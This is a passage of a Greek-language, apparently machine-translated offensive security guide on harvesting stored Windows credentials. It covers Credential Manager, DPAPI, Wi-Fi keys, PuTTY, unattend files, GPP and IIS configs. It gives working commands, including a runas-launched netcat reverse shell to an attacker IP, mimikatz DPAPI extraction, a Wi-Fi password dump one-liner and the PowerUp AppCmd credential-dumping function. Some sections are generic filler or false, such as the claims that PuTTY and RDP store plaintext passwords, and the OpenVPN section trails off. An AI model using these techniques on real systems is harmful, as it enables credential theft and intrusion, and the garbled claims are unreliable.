Το Θησαυροφυλάκιο των Windows αποθηκεύει διαπιστευτήρια που το Windows μπορεί να συνδεθεί αυτόματα με τους χρήστες, πράγμα που σημαίνει ότι οποιαδήποτε **εφαρμογή των Windows που χρειάζεται διαπιστευτήρια για πρόσβαση σε ένα πόρο** (διακομιστή ή ιστότοπο) **μπορεί να χρησιμοποιήσει αυτόν τον Διαχειριστή Διαπιστευτηρίων** και το Θησαυροφυλάκιο των Windows και να χρησιμοποιήσει τα παρεχόμενα διαπιστευτήρια αντί να ζητά από τους χρήστες να εισάγουν το όνομα χρήστη και τον κωδικό πρόσβασης κάθε φορά.

Εκτός αν οι εφαρμογές αλληλεπιδρούν με τον Διαχειριστή Διαπιστευτηρίων, δεν νομίζω ότι είναι δυνατόν να χρησιμοποιήσουν τα διαπιστευτήρια για έναν συγκεκριμένο πόρο. Έτσι, αν η εφαρμογή σας θέλει να χρησιμοποιήσει το θησαυροφυλάκιο, θα πρέπει κάπως να **επικοινωνήσει με τον διαχειριστή διαπιστευτηρίων και να ζητήσει τα διαπιστευτήρια για αυτόν τον πόρο** από το προεπιλεγμένο αποθηκευτικό θησαυροφυλάκιο.

Χρησιμοποιήστε την εντολή `cmdkey` για να εμφανίσετε τα αποθηκευμένα διαπιστευτήρια στη μηχανή.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Στη συνέχεια, μπορείτε να χρησιμοποιήσετε την εντολή `runas` με τις επιλογές `/savecred` για να χρησιμοποιήσετε τα αποθηκευμένα διαπιστευτήρια. Το παρακάτω παράδειγμα καλεί ένα απομακρυσμένο δυαδικό αρχείο μέσω ενός κοινόχρηστου SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Χρησιμοποιώντας την εντολή `runas` με ένα συγκεκριμένο σύνολο διαπιστευτηρίων.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Σημείωση ότι το mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), ή από το [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).

### DPAPI

Το **Data Protection API (DPAPI)** παρέχει μια μέθοδο για τη συμμετρική κρυπτογράφηση δεδομένων, κυρίως χρησιμοποιούμενη στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση εκμεταλλεύεται ένα μυστικό χρήστη ή συστήματος για να συνεισφέρει σημαντικά στην εντροπία.

Το **DPAPI επιτρέπει την κρυπτογράφηση των κλειδιών μέσω ενός συμμετρικού κλειδιού που προέρχεται από τα μυστικά σύνδεσης του χρήστη**. Σε περιπτώσεις που αφορούν την κρυπτογράφηση του συστήματος, χρησιμοποιεί τα μυστικά ελέγχου τομέα του συστήματος.

Τα κρυπτογραφημένα RSA κλειδιά χρήστη, χρησιμοποιώντας το DPAPI, αποθηκεύονται στον φάκελο `%APPDATA%\Microsoft\Protect\{SID}`, όπου `{SID}` αναπαριστά το [Security Identifier](https://en.wikipedia.org/wiki/Security\_Identifier) του χρήστη. **Το κλειδί DPAPI, που συνυπάρχει με τον κύριο κλειδί που προστατεύει τα ιδιωτικά κλειδιά του χρήστη στον ίδιο αρχείο**, αποτελείται συνήθως από 64 bytes τυχαίων δεδομένων. (Είναι σημαντικό να σημειωθεί ότι η πρόσβαση σε αυτόν τον φάκελο είναι περιορισμένη, αποτρέποντας την εμφάνιση των περιεχομένων του μέσω της εντολής `dir` στο CMD, αν και μπορεί να εμφανιστεί μέσω του PowerShell).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα ορίσματα (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα αρχεία **διαπιστευτήριων που προστατεύονται από τον κύριο κωδικό πρόσβασης** συνήθως βρίσκονται στις εξής τοποθεσίες:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για να αποκρυπτογραφήσετε.\
Μπορείτε να **εξάγετε πολλά DPAPI** **masterkeys** από την **μνήμη** με το module `sekurlsa::dpapi` (αν είστε root).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell Credentials

Οι **PowerShell credentials** χρησιμοποιούνται συχνά για **scripting** και αυτοματοποίηση καθηκόντων ως ένας τρόπος να αποθηκεύονται κρυπτογραφημένα διαπιστευτήρια με ευκολία. Τα διαπιστευτήρια προστατεύονται χρησιμοποιώντας το **DPAPI**, το οποίο συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

Για να **αποκρυπτογραφήσετε** ένα PS credentials από το αρχείο που το περιέχει, μπορείτε να κάνετε:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

Το Wifi είναι μια ασύρματη τεχνολογία δικτύου που επιτρέπει στις συσκευές να συνδεθούν σε ένα τοπικό δίκτυο χρησιμοποιώντας ασύρματα σήματα. Αυτή η τεχνολογία είναι ευρέως διαδεδομένη και χρησιμοποιείται σε πολλά σπίτια, γραφεία, καταστήματα και δημόσιους χώρους.

Για να συνδεθείτε σε ένα δίκτυο Wifi, χρειάζεστε έναν ασύρματο δρομολογητή ή ένα σημείο πρόσβασης (access point) που εκπέμπει το ασύρματο σήμα. Οι συσκευές όπως φορητοί υπολογιστές, κινητά τηλέφωνα και τάμπλετ μπορούν να συνδεθούν σε αυτό το δίκτυο χρησιμοποιώντας τον κωδικό πρόσβασης του δικτύου.

Ωστόσο, το Wifi μπορεί να είναι ευάλωτο σε επιθέσεις. Οι επιτιθέμενοι μπορούν να χρησιμοποιήσουν διάφορες τεχνικές για να παραβιάσουν την ασφάλεια του δικτύου Wifi και να αποκτήσουν πρόσβαση σε προσωπικά δεδομένα ή να πραγματοποιήσουν κακόβουλες ενέργειες.

Για να προστατεύσετε το δίκτυό σας από επιθέσεις Wifi, μπορείτε να λάβετε τα παρακάτω μέτρα ασφαλείας:

- Αλλάξτε τον προεπιλεγμένο κωδικό πρόσβασης του δρομολογητή σας.
- Χρησιμοποιήστε έναν ισχυρό κωδικό πρόσβασης για το δίκτυό σας.
- Ενεργοποιήστε την κρυπτογράφηση WPA2 ή WPA3 για το δίκτυό σας.
- Απενεργοποιήστε την ενεργοποίηση WPS (Wi-Fi Protected Setup) στο δρομολογητή σας.
- Ελέγξτε τη λίστα συνδεδεμένων συσκευών στο δίκτυό σας και αποσυνδέστε οποιαδήποτε άγνωστη συσκευή.
- Ενημερώστε το λογισμικό του δρομολογητή σας για να επιλύσετε γνωστά προβλήματα ασφαλείας.

Ακολουθώντας αυτά τα μέτρα ασφαλείας, μπορείτε να ενισχύσετε την ασφάλεια του δικτύου Wifi σας και να μειώσετε τον κίνδυνο επιθέσεων.
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Αποθηκευμένες συνδέσεις RDP

Μπορείτε να τις βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Πρόσφατες εκτελεσμένες εντολές
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Διαχειριστής Πιστοποιητικών Απομακρυσμένης Επιφάνειας Εργασίας**

The Remote Desktop Credential Manager is a Windows feature that allows users to store and manage their remote desktop credentials. These credentials are used to authenticate and establish a remote desktop connection to another computer or server.

By default, the Remote Desktop Credential Manager securely stores the username and password for each remote desktop connection. This allows users to easily connect to remote systems without having to enter their credentials each time.

However, from a security perspective, this feature can be a potential vulnerability. If an attacker gains access to a user's computer, they can extract the stored credentials from the Remote Desktop Credential Manager and use them to gain unauthorized access to other systems.

To mitigate this risk, it is recommended to regularly review and delete any unnecessary or outdated credentials stored in the Remote Desktop Credential Manager. Additionally, users should enable strong password policies and consider using multi-factor authentication for remote desktop connections.

For more information on how to manage and secure remote desktop credentials, refer to the official Microsoft documentation.
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Χρησιμοποιήστε το **Mimikatz** `dpapi::rdg` module με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε οποιοδήποτε αρχείο .rdg**\
Μπορείτε να **εξάγετε πολλά masterkeys DPAPI** από τη μνήμη με το Mimikatz `sekurlsa::dpapi` module

### Επικολλημένες Σημειώσεις

Οι άνθρωποι συχνά χρησιμοποιούν την εφαρμογή StickyNotes στους υπολογιστές με Windows για να **αποθηκεύουν κωδικούς πρόσβασης** και άλλες πληροφορίες, χωρίς να αντιλαμβάνονται ότι είναι ένα αρχείο βάσης δεδομένων. Αυτό το αρχείο βρίσκεται στη διαδρομή `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` και αξίζει πάντα να το αναζητάτε και να το εξετάζετε.

### AppCmd.exe

**Σημείωση ότι για να ανακτήσετε κωδικούς πρόσβασης από το AppCmd.exe πρέπει να είστε Διαχειριστής και να εκτελείτε με υψηλό επίπεδο ακεραιότητας.**\
Το **AppCmd.exe** βρίσκεται στον φάκελο `%systemroot%\system32\inetsrv\`.\
Αν αυτό το αρχείο υπάρχει, τότε είναι πιθανό να έχουν διαμορφωθεί κάποια **διαπιστευτήρια** και μπορούν να **ανακτηθούν**.

Αυτός ο κώδικας εξήχθη από το [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Ελέγξτε εάν υπάρχει το `C:\Windows\CCM\SCClient.exe`.\
Οι εγκαταστάτες εκτελούνται με **δικαιώματα του ΣΥΣΤΗΜΑΤΟΣ**, πολλοί είναι ευάλωτοι στο **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Αρχεία και Καταχωρήσεις (Διαπιστευτήρια)

### Διαπιστευτήρια Putty

```plaintext
Description: Putty is a popular SSH and telnet client for Windows. It stores its credentials in the Windows registry.

Location: HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions

Credentials: The credentials are stored as plain text in the registry values "UserName" and "Password" under each session key.

Impact: If an attacker gains access to the registry, they can extract the stored credentials and potentially gain unauthorized access to remote systems.

Mitigation: To protect against this, it is recommended to encrypt the registry or use a different SSH client that securely stores credentials.
```

```plaintext
Περιγραφή: Το Putty είναι ένα δημοφιλές πρόγραμμα πελάτη SSH και telnet για τα Windows. Αποθηκεύει τα διαπιστευτήριά του στο μητρώο των Windows.

Τοποθεσία: HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions

Διαπιστευτήρια: Τα διαπιστευτήρια αποθηκεύονται ως απλό κείμενο στις τιμές του μητρώου "UserName" και "Password" κάτω από κάθε κλειδί συνεδρίας.

Επίπτωση: Αν ένας επιτιθέμενος αποκτήσει πρόσβαση στο μητρώο, μπορεί να εξάγει τα αποθηκευμένα διαπιστευτήρια και πιθανώς να αποκτήσει μη εξουσιοδοτημένη πρόσβαση σε απομακρυσμένα συστήματα.

Αντιμετώπιση: Για να προστατευτείτε από αυτό, συνιστάται να κρυπτογραφήσετε το μητρώο ή να χρησιμοποιήσετε έναν διαφορετικό πελάτη SSH που αποθηκεύει τα διαπιστευτήρια με ασφάλεια.
```

### RDP Creds

```plaintext
Description: Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft that allows users to connect to a remote computer over a network connection. RDP credentials are stored in the Windows registry.

Location: HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default

Credentials: The credentials are stored as plain text in the registry values "UsernameHint" and "PasswordHint".

Impact: If an attacker gains access to the registry, they can extract the stored RDP credentials and potentially gain unauthorized access to remote systems.

Mitigation: To protect against this, it is recommended to encrypt the registry or use alternative remote desktop solutions that securely store credentials.
```

```plaintext
Περιγραφή: Το Remote Desktop Protocol (RDP) είναι ένα πρωτόκολλο που αναπτύχθηκε από τη Microsoft και επιτρέπει στους χρήστες να συνδεθούν σε έναν απομακρυσμένο υπολογιστή μέσω μιας σύνδεσης δικτύου. Τα διαπιστευτήρια RDP αποθηκεύονται στο μητρώο των Windows.

Τοποθεσία: HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default

Διαπιστευτήρια: Τα διαπιστευτήρια αποθηκεύονται ως απλό κείμενο στις τιμές του μητρώου "UsernameHint" και "PasswordHint".

Επίπτωση: Αν ένας επιτιθέμενος αποκτήσει πρόσβαση στο μητρώο, μπορεί να εξάγει τα αποθηκευμένα διαπιστευτήρια RDP και πιθανώς να αποκτήσει μη εξουσιοδοτημένη πρόσβαση σε απομακρυσμένα συστήματα.

Αντιμετώπιση: Για να προστατευτείτε από αυτό, συνιστάται να κρυπτογραφήσετε το μητρώο ή να χρησιμοποιήσετε εναλλακτικές λύσεις απομακρυσμένης επιφάνειας εργασίας που αποθηκεύουν τα διαπιστευτήρια με ασφάλεια.
```
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Κλειδιά Φιλοξενούμενου SSH του Putty

Οι κλειδια SSH του Putty αναφέρονται στα κλειδιά που χρησιμοποιούνται για την αυθεντικοποίηση των διακομιστών SSH στο Putty. Αυτά τα κλειδιά αποθηκεύονται στο αρχείο `known_hosts` στον υπολογιστή του χρήστη και χρησιμοποιούνται για να επαληθεύσουν την ταυτότητα του διακομιστή SSH πριν γίνει σύνδεση.

Όταν συνδέεστε σε έναν διακομιστή SSH για πρώτη φορά, το Putty θα σας ζητήσει να αποδεχτείτε το κλειδί του διακομιστή. Αν το αποδεχτείτε, το κλειδί θα αποθηκευτεί στο αρχείο `known_hosts` και θα χρησιμοποιείται για τις μελλοντικές συνδέσεις σε αυτόν τον διακομιστή.

Είναι σημαντικό να ελέγχετε τα κλειδιά του διακομιστή πριν αποδεχτείτε τη σύνδεση, καθώς αυτό μπορεί να προστατεύσει από επιθέσεις Man-in-the-Middle. Μπορείτε να ελέγξετε τα κλειδιά του διακομιστή χρησιμοποιώντας το εργαλείο `ssh-keygen` ή το εργαλείο `ssh-keyscan`.

Για να διαγράψετε ένα κλειδί από το αρχείο `known_hosts`, απλά ανοίξτε το αρχείο με έναν επεξεργαστή κειμένου και διαγράψτε τη γραμμή που αντιστοιχεί στο κλειδί του διακομιστή που θέλετε να διαγράψετε.
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Κλειδιά SSH στο μητρώο

Τα ιδιωτικά κλειδιά SSH μπορούν να αποθηκευτούν μέσα στο κλειδί μητρώου `HKCU\Software\OpenSSH\Agent\Keys`, οπότε θα πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Εάν βρείτε οποιαδήποτε καταχώρηση μέσα σε αυτήν τη διαδρομή, πιθανότατα θα είναι ένα αποθηκευμένο κλειδί SSH. Αποθηκεύεται κρυπτογραφημένο, αλλά μπορεί να αποκρυπτογραφηθεί εύκολα χρησιμοποιώντας το [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract).\
Περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Εάν ο υπηρεσία `ssh-agent` δεν εκτελείται και θέλετε να ξεκινά αυτόματα κατά την εκκίνηση, εκτελέστε:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Φαίνεται ότι αυτή η τεχνική δεν είναι πλέον έγκυρη. Προσπάθησα να δημιουργήσω μερικά κλειδιά ssh, να τα προσθέσω με την εντολή `ssh-add` και να συνδεθώ μέσω ssh σε ένα μηχάνημα. Το κλειδί HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν αναγνώρισε τη χρήση του `dpapi.dll` κατά την αυθεντικοποίηση με ασύμμετρα κλειδιά.
{% endhint %}

### Μη αναμενόμενα αρχεία
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας το **metasploit**: _post/windows/gather/enum\_unattend_

Παράδειγμα περιεχομένου:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Αντίγραφα ασφαλείας των αρχείων SAM & SYSTEM

Για να εκτελέσουμε επιτυχώς ορισμένες τεχνικές ιδιοποίησης τοπικών προνομίων στα Windows, χρειαζόμαστε πρόσβαση στα αρχεία SAM και SYSTEM. Αυτά τα αρχεία περιέχουν πληροφορίες για τους χρήστες, τους κωδικούς πρόσβασης και τις άδειες πρόσβασης στο σύστημα.

Για να αποκτήσουμε πρόσβαση σε αυτά τα αρχεία, μπορούμε να δημιουργήσουμε αντίγραφα ασφαλείας τους. Αυτό μπορεί να γίνει με διάφορους τρόπους, ανάλογα με την έκδοση των Windows που χρησιμοποιούμε.

Για τις παλαιότερες εκδόσεις των Windows (π.χ. Windows XP), μπορούμε να χρησιμοποιήσουμε το εργαλείο `pwdump`.

Για τις πιο πρόσφατες εκδόσεις των Windows (π.χ. Windows 10), μπορούμε να χρησιμοποιήσουμε το εργαλείο `mimikatz`.

Αφού αποκτήσουμε τα αντίγραφα ασφαλείας των αρχείων SAM και SYSTEM, μπορούμε να τα αναλύσουμε για να εξάγουμε πληροφορίες σχετικά με τους χρήστες και τους κωδικούς πρόσβασης τους. Αυτές οι πληροφορίες μπορούν να μας βοηθήσουν να εκτελέσουμε επιθέσεις ιδιοποίησης τοπικών προνομίων στο σύστημα.
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Πιστοποιητικά Νέφους

Οι πιστοποιητικοί νέφους αναφέρονται στις διαπιστευτήριες πληροφορίες που χρησιμοποιούνται για την πρόσβαση και την ταυτοποίηση σε υπηρεσίες νέφους. Αυτά τα πιστοποιητικά μπορούν να περιλαμβάνουν κωδικούς πρόσβασης, κλειδιά API, πιστοποιητικά SSL και άλλες πληροφορίες που απαιτούνται για την ασφαλή πρόσβαση σε υπηρεσίες νέφους.

Οι πιστοποιητικοί νέφους είναι κρίσιμοι για την ασφάλεια των υπηρεσιών νέφους, καθώς η διαρροή αυτών των πληροφοριών μπορεί να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση και κατάχρηση των υπηρεσιών. Είναι σημαντικό να λαμβάνονται κατάλληλα μέτρα για την προστασία και την ασφάλεια αυτών των πιστοποιητικών, όπως η χρήση ισχυρών κωδικών πρόσβασης, η αποθήκευση των πιστοποιητικών σε ασφαλή τοποθεσία και η περιορισμένη πρόσβαση σε αυτά μόνο από εξουσιοδοτημένα άτομα.
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Αναζητήστε ένα αρχείο με το όνομα **SiteList.xml**

### Κρυφός κωδικός GPP

Προηγουμένως υπήρχε μια δυνατότητα που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών διαχειριστή σε έναν ομάδα μηχανών μέσω των Προτιμήσεων Ομάδας Πολιτικής (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά προβλήματα ασφαλείας. Καταρχήν, τα αντικείμενα Πολιτικής Ομάδας (GPOs), που αποθηκεύονται ως αρχεία XML στο SYSVOL, μπορούσαν να προσπελαστούν από οποιονδήποτε χρήστη του τομέα. Δεύτερον, οι κωδικοί πρόσβασης μέσα σε αυτά τα GPPs, που κρυπτογραφούνται με AES256 χρησιμοποιώντας ένα προκαθορισμένο κλειδί που είναι δημοσίως τεκμηριωμένο, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε εξουσιοδοτημένο χρήστη. Αυτό αποτελούσε σοβαρό κίνδυνο, καθώς μπορούσε να επιτρέψει στους χρήστες να αποκτήσουν αυξημένα προνόμια.

Για να αντιμετωπιστεί αυτός ο κίνδυνος, αναπτύχθηκε μια λειτουργία για την ανίχνευση των τοπικά αποθηκευμένων αρχείων GPP που περιέχουν ένα πεδίο "cpassword" που δεν είναι κενό. Αφού βρεθεί ένα τέτοιο αρχείο, η λειτουργία αποκρυπτογραφεί τον κωδικό πρόσβασης και επιστρέφει ένα προσαρμοσμένο αντικείμενο PowerShell. Αυτό το αντικείμενο περιλαμβάνει λεπτομέρειες σχετικά με το GPP και την τοποθεσία του αρχείου, βοηθώντας στην αναγνώριση και αντιμετώπιση αυτής της ευπάθειας ασφαλείας.

Αναζητήστε στο `C:\ProgramData\Microsoft\Group Policy\history` ή στο _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (προηγούμενο της W Vista)_ για αυτά τα αρχεία:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Για να αποκρυπτογραφήσετε τον cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Χρησιμοποιώντας το crackmapexec για να αποκτήσετε τους κωδικούς πρόσβασης:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Ρύθμιση Ιστοσελίδας

Το IIS (Internet Information Services) είναι ένας διακομιστής ιστού που χρησιμοποιείται σε συστήματα Windows για τη φιλοξενία ιστοσελίδων. Η ρύθμιση του IIS γίνεται μέσω του αρχείου web.config, το οποίο περιέχει πληροφορίες σχετικά με τη διαμόρφωση και τη συμπεριφορά της ιστοσελίδας.

Το αρχείο web.config είναι γραμμένο σε μορφή XML και περιέχει διάφορες ενότητες και ρυθμίσεις που επηρεάζουν τη λειτουργία της ιστοσελίδας. Με την επεξεργασία αυτού του αρχείου, μπορείτε να προσαρμόσετε τις ρυθμίσεις του IIS για να επιτύχετε την επιθυμητή συμπεριφορά της ιστοσελίδας.

Οι κύριες ενότητες του αρχείου web.config περιλαμβάνουν:

- `<configuration>`: Η κύρια ενότητα που περιέχει όλες τις άλλες ενότητες του αρχείου.
- `<system.web>`: Περιέχει ρυθμίσεις που αφορούν τον τρόπο λειτουργίας της ιστοσελίδας, όπως οι ρυθμίσεις αυθεντικοποίησης, οι ρυθμίσεις διαχείρισης συνεδριών και οι ρυθμίσεις ασφάλειας.
- `<system.webServer>`: Περιέχει ρυθμίσεις που αφορούν τον τρόπο λειτουργίας του διακομιστή IIS, όπως οι ρυθμίσεις δρομολόγησης, οι ρυθμίσεις συμπίεσης και οι ρυθμίσεις ασφάλειας.

Με την επεξεργασία του αρχείου web.config, μπορείτε να προσαρμόσετε τις ρυθμίσεις του IIS για να βελτιώσετε την απόδοση, την ασφάλεια και τη λειτουργικότητα της ιστοσελίδας σας.
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Παράδειγμα του web.config με διαπιστευτήρια:

```xml
<configuration>
  <appSettings>
    <add key="DatabaseUsername" value="admin" />
    <add key="DatabasePassword" value="password123" />
  </appSettings>
</configuration>
```

Σημείωση: Αυτό είναι ένα παράδειγμα αρχείου web.config που περιέχει διαπιστευτήρια. Πρέπει να είστε προσεκτικοί και να μην αποθηκεύετε πραγματικά διαπιστευτήρια σε αυτό τον τρόπο, καθώς μπορεί να οδηγήσει σε διαρροή πληροφοριών.
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Διαπιστευτήρια OpenVPN

Για να συνδεθείτε στο δίκτυο OpenVPN, θα χρειαστείτε τα παρακάτω διαπιστευτήρια:

- Όνομα χρήστη: `<username>`
- Κωδικός πρόσβασης: `<password>`

